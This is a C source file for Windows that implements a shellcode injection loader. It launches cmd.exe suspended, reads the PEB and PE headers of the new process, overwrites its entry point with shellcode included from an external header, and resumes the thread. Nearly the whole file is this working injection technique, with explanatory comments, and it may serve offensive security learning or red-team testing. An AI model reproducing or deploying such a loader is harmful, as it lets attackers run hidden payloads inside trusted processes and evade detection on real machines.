#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib") // Link against ntdll.lib for Nt functions

int main() {

    #include "../shellcode.h"

    STARTUPINFOW si = { 0 };             // Initialize STARTUPINFO structure
    si.cb = sizeof(si);                 // Set the size of the structure
    si.dwFlags = STARTF_USESHOWWINDOW;  // Use the show window flag

    PROCESS_INFORMATION pi = { 0 };     // Initialize PROCESS_INFORMATION structure
    // Create the new process in a suspended state
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
    BOOL CreateProcessW(
        [in, optional]      LPCWSTR               lpApplicationName,
        [in, out, optional] LPWSTR                lpCommandLine,
        [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
        [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
        [in]                BOOL                  bInheritHandles,
        [in]                DWORD                 dwCreationFlags,
        [in, optional]      LPVOID                lpEnvironment,
        [in, optional]      LPCWSTR               lpCurrentDirectory,
        [in]                LPSTARTUPINFOW        lpStartupInfo,
        [out]               LPPROCESS_INFORMATION lpProcessInformation
    );
    */
    BOOL success = CreateProcessW( //It's CreateProcessW because we are using the wide-character version of the STARTUPINFO structure
        L"C:\\Windows\\System32\\cmd.exe",  // Application name
        NULL,                               // Command line
        NULL,                               // Process attributes
        NULL,                               // Thread attributes
        FALSE,                              // Do not inherit handles
        CREATE_SUSPENDED,                   // Creation flags - create the process in a suspended state
        NULL,                               // Use the parent's environment
        L"C:\\Windows\\System32",           // Current directory
        &si,                                // Pointer to STARTUPINFO structure
        &pi                                 // Pointer to PROCESS_INFORMATION structure
    );

    if (!success) {
        printf("CreateProcessW failed. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("Process created in suspended state. PID: %lu\n", pi.dwProcessId);


    // Retrieve the PEB address of the target process
    PROCESS_BASIC_INFORMATION pbi = { 0 };  // Initialize PROCESS_BASIC_INFORMATION structure
    ULONG returnLength = 0;                 // Variable to hold the return length
    NTSTATUS status = NtQueryInformationProcess(
        pi.hProcess,                        // Handle to the target process
        ProcessBasicInformation,            // Information class
        &pbi,                               // Pointer to PROCESS_BASIC_INFORMATION structure
        sizeof(pbi),                        // Size of the structure
        &returnLength                       // Pointer to return length variable
    );

    if (status != 0) {  // NTSTATUS 0 = SUCCESS, non-zero = error
        printf("NtQueryInformationProcess failed. NTSTATUS: 0x%X\n", status);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }
    printf("PEB address retrieved: %p\n", pbi.PebBaseAddress);

    // Calculate the address of the ImageBaseAddress in the PEB structure (offset 0x10 in 64-bit systems)
    LPVOID lpBaseAddress = (LPVOID)((DWORD64)(pbi.PebBaseAddress) + 0x10);

    // Read the ImageBaseAddress from the target process's PEB (4 bytes for 32-bit, 8 bytes for 64-bit)
    LPVOID remoteImageBase = 0;  // Variable to hold the remote image base address
    SIZE_T bytesRead = 0;        // Variable to hold the number of bytes read
    BOOL readSuccess = ReadProcessMemory(
        pi.hProcess,                // Handle to the target process
        lpBaseAddress,              // Address to read from
        &remoteImageBase,           // Buffer to store the read data
        8,                          // Number of bytes to read
        &bytesRead                  // Pointer to variable to receive number of bytes read
    );

    if (!readSuccess || bytesRead != 8) {
        printf("ReadProcessMemory failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }
    printf("Remote Image Base Address: %p\n", remoteImageBase);

    // Read the DOS header from the target process's image base
    IMAGE_DOS_HEADER dHeader = { 0 };
    readSuccess = ReadProcessMemory(
        pi.hProcess,             // Handle to the target process
        remoteImageBase,         // Address to read from
        &dHeader,                // Buffer to store the read data
        sizeof(dHeader),         // Number of bytes to read
        &bytesRead               // Pointer to variable to receive number of bytes read
    );
    if (!readSuccess || bytesRead != sizeof(dHeader)) {
        printf("ReadProcessMemory for DOS header failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }
    printf("DOS Header read successfully. e_lfanew: 0x%X\n", dHeader.e_lfanew);

    // Use e_lfanew to locate and read the NT headers
    LPVOID lpNtHeaders = (LPVOID)((DWORD64)remoteImageBase + dHeader.e_lfanew);

    // Read the NT headers from the target process's image base
    IMAGE_NT_HEADERS64 ntHeaders = { 0 };
    readSuccess = ReadProcessMemory(
        pi.hProcess,             // Handle to the target process
        lpNtHeaders,             // Address to read from
        &ntHeaders,              // Buffer to store the read data
        sizeof(ntHeaders),       // Number of bytes to read
        &bytesRead               // Pointer to variable to receive number of bytes read
    );

    if (!readSuccess || bytesRead != sizeof(ntHeaders)) {
        printf("ReadProcessMemory for NT headers failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }
    printf("NT Headers read successfully. EntryPoint: 0x%X\n", ntHeaders.OptionalHeader.AddressOfEntryPoint);

    // Calculate the address of the entry point in the target process
    LPVOID lpEntryPoint = (LPVOID)((DWORD64)remoteImageBase + ntHeaders.OptionalHeader.AddressOfEntryPoint);

    // Write the shellcode to the entry point of the target process (Overwrite original PE)
    SIZE_T bytesWritten = 0;  // Variable to hold the number of bytes written
    BOOL writeSuccess = WriteProcessMemory(
        pi.hProcess,             // Handle to the target process
        lpEntryPoint,            // Address to write to
        shellcode,               // Pointer to the shellcode
        sizeof(shellcode),       // Size of the shellcode
        &bytesWritten            // Pointer to variable to receive number of bytes written
    );

    if (!writeSuccess || bytesWritten != sizeof(shellcode)) {
        printf("WriteProcessMemory failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }
    printf("Shellcode written successfully to entry point.\n");

    // Resume the main thread of the target process to execute the shellcode
    DWORD resumeResult = ResumeThread(pi.hThread);
    if (resumeResult == (DWORD)-1) {
        printf("ResumeThread failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }
    printf("Process resumed. Shellcode is executing.\n");

    // Clean up handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}